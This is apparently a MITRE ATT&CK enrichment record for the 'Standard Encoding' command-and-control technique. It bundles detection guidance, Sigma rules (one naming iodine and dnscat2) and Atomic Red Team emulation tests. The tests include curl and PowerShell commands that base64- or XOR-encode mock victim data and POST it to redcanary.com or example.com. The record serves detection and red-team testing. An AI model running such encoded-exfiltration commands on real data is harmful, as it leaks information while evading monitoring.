{
    "id": "T1132.001",
    "name": "Standard Encoding",
    "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Command and Control",
    "data_sources": "Network Traffic: Network Traffic Content",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
    "url": "https://attack.mitre.org/techniques/T1132/001",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1132.001",
                "atomic_attack_guid": "2d97c626-7652-449e-a986-b02d9051c298",
                "atomic_attack_name": "Base64 Encoded data (freebsd)",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Curl Usage on Linux",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_curl_usage.yml",
                        "remote_content": "title: Curl Usage on Linux\nid: ea34fb97-e2c4-4afb-810f-785e4459b194\nstatus: test\ndescription: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-15\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: low\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Linux Ingress Tool Transfer Hunting",
                        "rule_link": "https://research.splunk.com/endpoint/52fd468b-cb6d-48f5-b16a-92f1c9bb10cf/"
                    }
                ]
            },
            {
                "tech_id": "T1132.001",
                "atomic_attack_guid": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25",
                "atomic_attack_name": "Base64 Encoded data.",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Curl Usage on Linux",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_curl_usage.yml",
                        "remote_content": "title: Curl Usage on Linux\nid: ea34fb97-e2c4-4afb-810f-785e4459b194\nstatus: test\ndescription: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-15\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: low\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Linux Ingress Tool Transfer Hunting",
                        "rule_link": "https://research.splunk.com/endpoint/52fd468b-cb6d-48f5-b16a-92f1c9bb10cf/"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "04fd5427-79c7-44ea-ae13-11b24778ff1c",
                    "98a96a5a-64a0-4c42-92c5-489da3866cb0",
                    "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404"
                ],
                "lookup_results": [
                    {
                        "uuid": "04fd5427-79c7-44ea-ae13-11b24778ff1c",
                        "lookup_data": {
                            "mitre-attack-id": "T1132.001",
                            "mitre-cti:description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
                            "mitre-cti:name": "Standard Encoding",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c', 'type': 'attack-pattern', 'created': '2020-03-14T23:36:52.095Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1132.001', 'url': 'https://attack.mitre.org/techniques/T1132/001'}, {'url': 'https://en.wikipedia.org/wiki/Binary-to-text_encoding', 'description': 'Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.', 'source_name': 'Wikipedia Binary-to-text Encoding'}, {'url': 'https://en.wikipedia.org/wiki/Character_encoding', 'description': 'Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.', 'source_name': 'Wikipedia Character Encoding'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2020-03-14T23:36:52.095Z', 'name': 'Standard Encoding', 'description': 'Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}], 'x_mitre_detection': 'Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content'], 'x_mitre_permissions_required': ['User']}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "98a96a5a-64a0-4c42-92c5-489da3866cb0",
                        "lookup_data": {
                            "description": "Well-known DNS Exfiltration tools execution",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Well-known DNS Exfiltration tools execution\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\iodine.exe\n  - Image|contains: \\dnscat2\nfalsepositives:\n- \"Legitimate usage of iodine or dnscat2 \\u2014 DNS Exfiltration tools (unlikely)\"\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.001\n- attack.command_and_control\n- attack.t1071.004\n- attack.t1132.001\ntitle: DNS Exfiltration and Tunneling Tools Execution\n",
                            "sigma:id": "98a96a5a-64a0-4c42-92c5-489da3866cb0",
                            "title": "DNS Exfiltration and Tunneling Tools Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                        "lookup_data": {
                            "description": "FontOnLake: Previously unknown malware family targeting Linux",
                            "link": "http://www.botvrij.eu/data/feed-osint/5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1633682506",
                            "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1132.001",
                "display_name": "Data Encoding: Standard Encoding",
                "atomic_tests": [
                    {
                        "name": "Base64 Encoded data.",
                        "auto_generated_guid": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25",
                        "description": "Utilizing a common technique for posting base64 encoded data.\n",
                        "supported_platforms": [
                            "macos",
                            "linux"
                        ],
                        "input_arguments": {
                            "destination_url": {
                                "description": "Destination URL to post encoded data.",
                                "type": "url",
                                "default": "redcanary.com"
                            },
                            "base64_data": {
                                "description": "Encoded data to post using fake Social Security number 111-11-1111.",
                                "type": "string",
                                "default": "MTExLTExLTExMTE="
                            }
                        },
                        "executor": {
                            "command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "Base64 Encoded data (freebsd)",
                        "auto_generated_guid": "2d97c626-7652-449e-a986-b02d9051c298",
                        "description": "Utilizing a common technique for posting base64 encoded data.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "destination_url": {
                                "description": "Destination URL to post encoded data.",
                                "type": "url",
                                "default": "redcanary.com"
                            },
                            "base64_data": {
                                "description": "Encoded data to post using fake Social Security number 111-11-1111.",
                                "type": "string",
                                "default": "MTExLTExLTExMTE="
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Requires curl\n",
                                "prereq_command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n",
                                "get_prereq_command": "pkg install -y curl\n"
                            }
                        ],
                        "executor": {
                            "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "XOR Encoded data.",
                        "auto_generated_guid": "c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08",
                        "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "destination_url": {
                                "description": "Destination URL to post encoded data.",
                                "type": "url",
                                "default": "example.com"
                            },
                            "plaintext": {
                                "description": "Plain text mimicking victim data sent to C2 server.",
                                "type": "string",
                                "default": "Path\\n----\\nC:\\Users\\victim"
                            },
                            "key": {
                                "description": "XOR key used for encoding the plaintext.",
                                "type": "string",
                                "default": "abcdefghijklmnopqrstuvwxyz123456"
                            }
                        },
                        "executor": {
                            "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n",
                            "name": "powershell"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 13:21:00"
}